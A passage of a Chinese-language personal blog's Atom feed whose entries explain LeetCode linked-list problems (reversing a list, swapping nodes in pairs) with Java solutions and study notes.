tmp;</span><br><span class="line">                n = n / <span class="number">10</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="Tip"><a href="#Tip" class="headerlink" title="Tip"></a>Tip</h6><p> <strong>所有由此观之，所有判断元素是否出现过的题目都可以用哈希法解决.</strong><br><strong>一般哈希表都是用来快速判断一个元素是否出现集合里.</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h3 id=&quot;两个数组的交集&quot;&gt;&lt;a href=&quot;#两个数组的交集&quot; class=&quot;headerlink&quot; title=&quot;两个数组的交集&quot;&gt;&lt;/a&gt;两个数组的交集&lt;/h3&gt;&lt;p&gt;link：&lt;a href=&quot;https://leetcode.cn/problems/interse</summary>
      
    
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/categories/Algorithm/"/>
    
    
  </entry>
  
  <entry>
    <title>yubのAlgorithm.0x5</title>
    <link href="https://yubut.github.io/2024/11/08/yub%E3%81%AEAlgorithm.0x5/"/>
    <id>https://yubut.github.io/2024/11/08/yub%E3%81%AEAlgorithm.0x5/</id>
    <published>2024-11-08T06:28:43.000Z</published>
    <updated>2024-11-09T05:53:13.545Z</updated>
    
    <content type="html"><![CDATA[<h4 id="反转链表"><a href="#反转链表" class="headerlink" title="反转链表"></a>反转链表</h4><p>link：<a href="https://leetcode.cn/problems/reverse-linked-list/">206. 反转链表 - 力扣（LeetCode）</a></p><h5 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h5><p>与数组不同，链表没必要定义新的链表进行存储【对内存空间的浪费】<br>直接改变next指针即可.<br><strong>注意头节点指向的下一个节点为null</strong></p><h6 id="双指针法"><a href="#双指针法" class="headerlink" title="双指针法"></a>双指针法</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="comment">//双指针操作 </span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">cur</span> <span class="operator">=</span> head;</span><br><span class="line">        <span class="comment">//记录节点</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">while</span>(cur != <span class="literal">null</span>) &#123;</span><br><span class="line">            temp = cur.next;<span class="comment">//保存下一个节点</span></span><br><span class="line">            cur.next = prev;</span><br><span class="line">            <span class="comment">//赋值之后整体向后移动</span></span><br><span class="line"><span class="comment">//注意先移动prev 不如cur已经移动后记录不到prev新的位置</span></span><br><span class="line">            prev = cur;</span><br><span class="line">            cur = temp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> prev;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="递归法"><a href="#递归法" class="headerlink" title="递归法"></a>递归法</h6><p>和双指针法是一样的逻辑【升华版】</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">      <span class="comment">//prev -&gt; null 初始化 head反转的第一个节点 启动反转操作</span></span><br><span class="line">        <span class="keyword">return</span> reverse(<span class="literal">null</span>, head);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> ListNode <span class="title function_">reverse</span><span class="params">(ListNode prev, ListNode cur)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(cur == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> prev;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">temp</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        temp = cur.next;</span><br><span class="line">        cur.next = prev;</span><br><span class="line">        <span class="comment">//更新prev和cur的位置</span></span><br><span class="line">        <span class="keyword">return</span> reverse(cur,temp);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//从后向前递归</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span>&#123;</span><br><span class="line">    ListNode <span class="title function_">reverseList</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="comment">//边缘条件判断</span></span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span>) <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">if</span>(head.next == <span class="literal">null</span>) <span class="keyword">return</span> head;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//递归调用 翻转头节点之后的链表</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">last</span> <span class="operator">=</span> reverseList(head.next);</span><br><span class="line">        <span class="comment">//翻转头节点之后链表的指向</span></span><br><span class="line">        head.next.next = head;</span><br><span class="line">        <span class="comment">//此时的head节点为尾节点, next需要指向null</span></span><br><span class="line">        head.next = <span class="literal">null</span>;  </span><br><span class="line">        <span class="keyword">return</span> last;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="两两交换链表中的节点"><a href="#两两交换链表中的节点" class="headerlink" title="两两交换链表中的节点"></a>两两交换链表中的节点</h5><p>link：<a href="https://leetcode.cn/problems/swap-nodes-in-pairs/description/">24. 两两交换链表中的节点 - 力扣（LeetCode）</a></p><h5 id="思路分析-1"><a href="#思路分析-1" class="headerlink" title="思路分析"></a>思路分析</h5><p><strong>注意在交换之前要先存储需要的值</strong></p><h6 id="递归"><a href="#递归" class="headerlink" title="递归"></a>递归</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">swapPairs</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">null</span> || head.next == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">next</span> <span class="operator">=</span> head.next;</span><br><span class="line">        <span class="comment">//进行递归</span></span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">newNode</span> <span class="operator">=</span> swapPairs(next.next);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//交换</span></span><br><span class="line">        next.next = head;</span><br><span class="line">        head.next = newNode;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="虚拟头节点"><a href="#虚拟头节点" class="headerlink" title="虚拟头节点"></a>虚拟头节点</h6><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/df4a92582bd1bc37e60fd7f3bd7916a4.png" alt="img"></p><p>我们想实现的是1和2交换，3和 4交换，此时很难不想到借用中间变量实现，不用递归实现【每次单独处理头节点】更优雅.<br>注意5后面是空指针就不用交换<br>判断next.next不为空是为了防止空指针异常</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> ListNode <span class="title function_">swapPairs</span><span class="params">(ListNode head)</span> &#123;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">dummy</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        dummy.next = head;</span><br><span class="line">        <span class="type">ListNode</span> <span class="variable">prev</span> <span class="operator">=</span> dummy;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (prev.next != <span class="literal">null</span> &amp;&amp; prev.next.next != <span class="literal">null</span>) &#123;</span><br><span class="line">      <span class="type">ListNode</span> <span class="variable">temp</span> <span class="operator">=</span> head.next.next; <span class="comment">// 缓存 next</span></span><br><span class="line">      prev.next = head.next;          <span class="comment">// 将 prev 的 next 改为 head 的 next</span></span><br><span class="line">      head.next.next = head;          <span class="comment">// 将 head.next(prev.next) 的next，指向 head</span></span><br><span class="line">      head.next = temp;               <span class="comment">// 将head 的 next 接上缓存的temp</span></span><br><span class="line">      prev = head;                    <span class="comment">// 步进1位</span></span><br><span class="line">      head = head.next;               <span class="comment">// 步进1位</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dummy.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h4 id=&quot;反转链表&quot;&gt;&lt;a href=&quot;#反转链表&quot; class=&quot;headerlink&quot; title=&quot;反转链表&quot;&gt;&lt;/a&gt;反转链表&lt;/h4&gt;&lt;p&gt;link：&lt;a href=&quot;https://leetcode.cn/problems/reverse-linked-list</summary>
      
    
    
    
    <category term="Algorithm" scheme="https://yubut.github.io/categories/Algorithm/"/>
    
    
  </entry>
  
</feed>
